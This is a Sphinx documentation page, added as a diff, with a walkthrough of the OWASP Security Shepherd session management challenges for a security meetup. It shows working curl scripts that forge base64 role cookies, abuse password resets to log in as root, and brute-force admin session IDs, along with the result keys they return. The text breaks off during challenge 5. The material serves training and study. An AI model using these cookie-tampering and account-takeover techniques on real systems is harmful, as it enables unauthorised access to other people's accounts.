@@ -1,0 +1,550 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.15.8. Session Management &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3.15. Security Shepherd Web App Levels" href="security_shepherd.html"/>
+        <link rel="next" title="3.15.9. XSS" href="security_shepherd_xss.html"/>
+        <link rel="prev" title="3.15.7. Insecure Direct Object References" href="security_shepherd_direct_ref.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_intro.html">3.15.1. Security Shepherd Introduction</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_lessons.html">3.15.2. Lessons</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_csrf.html">3.15.3. CSRF</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_url_access.html">3.15.4. Failure to Restrict URL Access</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_injection.html">3.15.5. Injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_crypto_storage.html">3.15.6. Insecure Cryptographic Storage</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_direct_ref.html">3.15.7. Insecure Direct Object References</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">3.15.8. Session Management</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-1">3.15.8.1. Session Management Challenge 1</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-2">3.15.8.2. Session Management Challenge 2</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-3">3.15.8.3. Session Management Challenge 3</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-4">3.15.8.4. Session Management Challenge 4</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-5">3.15.8.5. Session Management Challenge 5</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-6">3.15.8.6. Session Management Challenge 6</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-7">3.15.8.7. Session Management Challenge 7</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#session-management-challenge-8">3.15.8.8. Session Management Challenge 8</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_xss.html">3.15.9. XSS</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+          <li><a href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a> &raquo;</li>
+        
+      <li>3.15.8. Session Management</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/security_shepherd_session_management.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="session-management">
+<span id="securityshepherdsessionmanagement"></span><h1>3.15.8. Session Management<a class="headerlink" href="#session-management" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="session-management-challenge-1">
+<h2>3.15.8.1. Session Management Challenge 1<a class="headerlink" href="#session-management-challenge-1" title="Permalink to this headline">¶</a></h2>
+<p>This challenge involves modifying a cookie to get administrator access. Using Tamper Data on the <span class="guilabel">Administrator Only Button</span> button reveals a cookie “checksum=dXNlclJvbGU9dXNlcg==”. Using <code class="docutils literal"><span class="pre">echo</span> <span class="pre">-n</span> <span class="pre">&quot;$checksum&quot;</span> <span class="pre">|</span> <span class="pre">base64</span> <span class="pre">-d</span></code> its base64-decoded value is “userRole=user”. The idea is to try other values: “admin” does not work but “administrator” does work. Here goes the <strong class="program">curl</strong> request returning the result key:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides the URL, COOKIE, and POSTDATA.</span>
+<span class="c1"># NOTE: POSTDATA is modified below.</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a&#39;</span>
+<span class="nv">COOKIE_BASE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3=&quot;iuysOEpMSlZw8gEtl0o1UQ==&quot;&#39;</span>
+
+<span class="hll"><span class="c1"># change userRole cookie to base64 &quot;userRole=administrator&quot;</span>
+</span><span class="hll"><span class="nv">ROLE</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;userRole=administrator&quot;</span> <span class="p">|</span> base64<span class="k">)</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;checksum=</span><span class="nv">$ROLE</span><span class="s2">; </span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+</span>
+<span class="c1"># Tamper Data provides POSTDATA model whose values are changed as below.</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s1">&#39;adminDetected=true&#39;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s1">&#39;returnPassword=true&#39;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s1">&#39;upgradeUserToAdmin=true&#39;</span> <span class="se">\</span>
+</span>     <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Your result key is as follows</span>
+</span><span class="hll"><span class="go">WSm0SScs3ZjJUvElMYU/7ywnTOdPiOSSkIsuUBETKvUM3UN9EU58n6/CK6slOUQDlr1tpWUTdWjBcck2flBILzJCp2qg0H78zPhZDMDITFc=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-2">
+<h2>3.15.8.2. Session Management Challenge 2<a class="headerlink" href="#session-management-challenge-2" title="Permalink to this headline">¶</a></h2>
+<p>This challenge involves first using an error message to get an administrator’s email account name, then exploiting the cookie from the prior session management challenge to reset an adminitrator’s password, allowing logging on as the administrator.</p>
+<p>Clicking the <span class="guilabel">Have you forgotten your password?</span> button reveals a <span class="guilabel">Reset Password</span> button that needs an email address. Fortunately, the <span class="guilabel">Sign In</span> button has a nice error message echoing back the email address for bad password attempts. Trying several admin-like usernames revealed “root” = “<a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>”, “admin” = “<a class="reference external" href="mailto:zoidberg22&#37;&#52;&#48;shepherd&#46;com">zoidberg22<span>&#64;</span>shepherd<span>&#46;</span>com</a>”, and “administrator” = “<a class="reference external" href="mailto:buzzthebald&#37;&#52;&#48;shepherd&#46;com">buzzthebald<span>&#64;</span>shepherd<span>&#46;</span>com</a>”. Of these 3 candidates for the <span class="guilabel">Reset Password</span> button we’ll try “<a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>”.</p>
+<p>Use Tamper Data to intercept the <span class="guilabel">Reset Password</span> request for “<a class="reference external" href="mailto:elitehacker&#37;&#52;&#48;shepherd&#46;com">elitehacker<span>&#64;</span>shepherd<span>&#46;</span>com</a>”; the request fails to reset the password. Remember the prior session management challenge used a “checksum” cookie with “userRole=administrator”; using that here results in resetting root’s password which then allowed logging in as root and getting the result key. Here is the <strong class="program">curl</strong> exploit:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides the URL, COOKIE, and POSTDATA (below).</span>
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+<span class="nv">URL_PWRESET</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/f5ddc0ed2d30e597ebacf5fdd117083674b19bb92ffc3499121b9e6a12c92959&quot;</span>
+<span class="nv">URL_LOGIN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/d779e34a54172cbc245300d3bc22937090ebd3769466a501a5e7ac605b9f34b7&quot;</span>
+<span class="nv">COOKIE_BASE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3=&quot;iuysOEpMSlZw8gEtl0o1UQ==&quot;&#39;</span>
+
+<span class="hll"><span class="nv">U</span><span class="o">=</span><span class="s2">&quot;root&quot;</span>
+</span><span class="hll"><span class="nv">EMAIL</span><span class="o">=</span><span class="s2">&quot;elitehacker@shepherd.com&quot;</span>
+</span>
+<span class="c1"># Password reset request for root/elitehacker@shepherd.com.</span>
+<span class="hll"><span class="c1"># Set userRole=administrator</span>
+</span><span class="hll"><span class="nv">ROLE</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;userRole=administrator&quot;</span> <span class="p">|</span> base64<span class="k">)</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;checksum=</span><span class="nv">$ROLE</span><span class="s2">; </span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+</span><span class="nv">PW</span><span class="o">=</span><span class="k">$(</span>curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;subEmail=</span><span class="nv">$EMAIL</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="nv">$URL_PWRESET</span> <span class="p">|</span> <span class="se">\</span>
+   sed -ne <span class="s1">&#39;s/^.*Changed to: \(-*[0-9]*\).*$/\1/p&#39;</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&quot;Password is </span><span class="nv">$PW</span><span class="s2">&quot;</span>
+
+<span class="c1"># Login with the temporary password</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;subName=</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;subPassword=</span><span class="nv">$PW</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="nv">$URL_LOGIN</span> <span class="p">|</span> <span class="se">\</span>
+  sed -ne <span class="s1">&#39;s/^.*\(The result key is \)&lt;a&gt;\(.*\)&lt;\/a&gt;.*$/\1\2\n/p&#39;</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">2V7A4hpcHWV57wXsdhcynpIlTa9oEbjdJg8AFIIkZYhWqd7mITE8KkX9qX8MQEj28QdeUeIuyYFT4Fpsx4HQ8RD8gjI0Ka5JlZ8vjWqkwUc=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-3">
+<h2>3.15.8.3. Session Management Challenge 3<a class="headerlink" href="#session-management-challenge-3" title="Permalink to this headline">¶</a></h2>
+<p>This challenge involves tampering the cookie used by the <span class="guilabel">Change Password</span> function to identify the affected user. Tampering the cookie to root’s user id allows logging in as root to get the result key.</p>
+<p>Clicking the <span class="guilabel">Toggle user functions</span> button reveals a <span class="guilabel">Change Password</span> functionality that doesn’t require entering your user id. Using Tamper Data on the request reveals cookie “current=WjNWbGMzUXhNZz09”. Running <code class="docutils literal"><span class="pre">echo</span> <span class="pre">-n</span> <span class="pre">&quot;WjNWbGMzUXhNZz09&quot;</span> <span class="pre">|</span> <span class="pre">base64</span> <span class="pre">|</span> <span class="pre">base64</span></code> reveals the value “guest12”. So perhaps using <code class="docutils literal"><span class="pre">current=$(echo</span> <span class="pre">-n</span> <span class="pre">&quot;root&quot;</span> <span class="pre">|</span> <span class="pre">base64</span> <span class="pre">|</span> <span class="pre">base64)</span></code> will cause root’s password to be reset. That is exactly what happens here:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides the URL, COOKIE, and POSTDATA (below).</span>
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+<span class="nv">URL_PWRESET</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a&quot;</span>
+<span class="nv">URL_LOGIN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3&quot;</span>
+<span class="nv">COOKIE_BASE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3=&quot;iuysOEpMSlZw8gEtl0o1UQ==&quot;&#39;</span>
+
+<span class="c1"># Change cookie to root user, then reset password to &quot;password&quot;.</span>
+<span class="hll"><span class="nv">U</span><span class="o">=</span><span class="s2">&quot;root&quot;</span>
+</span><span class="hll"><span class="nv">PASSWORD</span><span class="o">=</span><span class="s2">&quot;password&quot;</span>
+</span><span class="hll"><span class="nv">CURRENT</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="nv">$U</span> <span class="p">|</span> base64 <span class="p">|</span> base64<span class="k">)</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;current=</span><span class="nv">$CURRENT</span><span class="s2">; </span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+</span>curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;newPassword=</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="nv">$URL_PWRESET</span>
+
+<span class="c1"># Login with the temporary password to reveal the result key.</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">     --data-urlencode <span class="s2">&quot;subUserName=</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">     --data-urlencode <span class="s2">&quot;subUserPassword=</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span>     <span class="nv">$URL_LOGIN</span> <span class="p">|</span> <span class="se">\</span>
+  sed -ne <span class="s1">&#39;s/^.*\(The result key is \)&lt;a&gt;\(.*\)&lt;\/a&gt;.*$/\1\2\n/p&#39;</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">W0XCm9DMsQLH8owbcmjBNmtBc05D/aOCRvGaNCpwYjFzRbBmD6tzi/QssSTXmCQcvLASW5SZ9kIWMp7dMVIHgZQcDLGVGUZwLXryoINaC7s=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-4">
+<h2>3.15.8.4. Session Management Challenge 4<a class="headerlink" href="#session-management-challenge-4" title="Permalink to this headline">¶</a></h2>
+<p>This challenge involves tampering the cookie used by the <span class="guilabel">Admin Only Button</span> function to identify the session id. Tampering the cookie to an administrator’s seesion allows getting access to the <span class="guilabel">Admin Only Button</span> function to get the result key.</p>
+<p>Using Tamper Data on the <span class="guilabel">Admin Only Button</span> reveals cookie “SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09”. Running <code class="docutils literal"><span class="pre">echo</span> <span class="pre">-n</span> <span class="pre">&quot;TURBd01EQXdNREF3TURBd01EQXdNUT09&quot;</span> <span class="pre">|</span> <span class="pre">base64</span> <span class="pre">-d</span> <span class="pre">|</span> <span class="pre">base64</span> <span class="pre">-d</span></code> returns “0000000000000001”. Perhaps by repeatedly trying different values start at “0000000000000000” may get access to <span class="guilabel">Admin Only Button</span>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides the URL, COOKIE, and POSTDATA (below).</span>
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6&quot;</span>
+<span class="nv">COOKIE_BASE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3=&quot;iuysOEpMSlZw8gEtl0o1UQ==&quot;&#39;</span>
+
+<span class="c1"># Search for a subsession ID that is an admin:</span>
+<span class="k">for</span> i in <span class="o">{</span><span class="m">0</span>..99<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
+<span class="hll">  <span class="nv">U</span><span class="o">=</span><span class="s2">&quot;000000000000000</span><span class="nv">$i</span><span class="s2">&quot;</span>
+</span><span class="hll">  <span class="nv">U</span><span class="o">=</span><span class="si">${</span><span class="nv">U</span><span class="p">:(-16)</span><span class="si">}</span>
+</span>  <span class="nb">echo</span> -e <span class="s2">&quot;\n\n *************** TRYING </span><span class="nv">$U</span><span class="s2"> ***************** &quot;</span>
+<span class="hll">  <span class="nv">SUBSESSIONID</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="p">|</span> base64 <span class="p">|</span> base64<span class="k">)</span>
+</span><span class="hll">  <span class="nv">SUBSESSIONID</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">SUBSESSIONID</span><span class="p">%Cg==</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class="hll">  <span class="nv">COOKIE</span><span class="o">=</span><span class="s2">&quot;SubSessionID=</span><span class="nv">$SUBSESSIONID</span><span class="s2">; </span><span class="nv">$COOKIE_BASE</span><span class="s2">&quot;</span>
+</span>  <span class="nv">RESULT</span><span class="o">=</span><span class="k">$(</span>curl --silent --insecure  <span class="se">\</span>
+       --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+       --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+<span class="hll">       --data-urlencode <span class="s2">&quot;userId=0000000000000001&quot;</span> <span class="se">\</span>
+</span>       --data-urlencode <span class="s2">&quot;useSecurity=true&quot;</span> <span class="se">\</span>
+       <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span><span class="k">)</span>
+  <span class="k">if</span> <span class="o">[[</span> ! <span class="s2">&quot;</span><span class="nv">$RESULT</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;Your not an Admin&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="nv">$RESULT</span>
+    break<span class="p">;</span>
+  <span class="k">fi</span>
+<span class="k">done</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">*************** TRYING 0000000000000021 *****************</span>
+</span><span class="hll"><span class="go">Welcome administrator. Your result key is as follows</span>
+</span><span class="hll"><span class="go">38k0w8iIAOIWhxN/AZYCm1sTIIWsTGgXzvbqEDeFT8EErGyPOPLzCosYCQVaMlhPeo78GBahLo6alDFkNS3DmHOISQhY2YeQ+gaRgpOBz4U=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="session-management-challenge-5">
+<h2>3.15.8.5. Session Management Challenge 5<a class="headerlink" href="#session-management-challenge-5" title="Permalink to this headline">¶</a></h2>
+<p>This challenge involves finding a hidden “ChangePass” form and realizing that the required “resetPasswordToken” is a base64-encode <code class="docutils literal"><span class="pre">date</span></code> string.</p>
+<p>Using Firebug reveals not only the visible <span class="guilabel">Sign In</span> and <span class="guilabel">Send Email</span> buttons, but there’s also a hidden “ChangePass” form that accepts three parameters: userName, newPassword, and resetPasswordToken. An inspection of the JavaScript is supposed to reveal that the resetPasswordToken is a base64-encoded <code class="docutils literal"><span class="pre">date</span></code>. The following is a <strong class="program">curl</strong> exploit of this form. The only part that’s easier to do from <strong class="program">curl</strong> is the hidden form.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data provides the URL, COOKIE, and POSTDATA (below).</span>
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+<span class="nv">URL_SENDEMAIL</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1SendToken&quot;</span>
+<span class="nv">URL_CHANGEPW</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass&quot;</span>
+<span class="nv">URL_SIGNIN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1&quot;</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3=&quot;iuysOEpMSlZw8gEtl0o1UQ==&quot;&#39;</span>
+
+<span class="hll"><span class="c1"># Guess of an admin user.</span>
+</span><span class="hll"><span class="nv">U</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span>
+</span><span class="hll"><span class="nv">PASSWORD</span><span class="o">=</span><span class="s2">&quot;passwordpassword&quot;</span>
+</span>
+<span class="hll"><span class="c1"># Firebug shows JavaScript describing TOKEN</span>
+</span><span class="hll"><span class="nv">TOKEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>date <span class="p">|</span> base64<span class="k">)</span><span class="s2">&quot;</span>
+</span>
+<span class="c1"># Get change password email</span>
